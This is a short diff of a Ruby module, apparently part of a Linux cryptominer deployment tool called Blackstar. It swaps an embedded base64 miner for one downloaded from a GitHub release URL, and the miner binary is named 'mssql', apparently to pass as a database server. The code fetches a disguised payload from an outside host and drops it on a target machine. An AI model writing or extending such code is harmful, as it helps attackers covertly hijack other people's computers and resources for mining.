@@ -1,5 +1,6 @@
 module Blackstar
   class MinerLinux
+    MINER_GITHUB = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/mssql"
     attr_reader :miner_path, :config_path, :output_miner_path, :base_path, :host
     attr_accessor :miner_started
 
@@ -46,9 +47,8 @@ module Blackstar
 
     def copy_new_files
       Cmd.call("mkdir -p #{base_path}")
-      File.open(miner_path, 'w') do |f|
-        f.write(Base64::decode(Linux::MINER_BASE64))
-      end
+
+      Cmd.download_file(:linux, @base_path, MINER_GITHUB)
 
       host.generate_config(config_path)
 
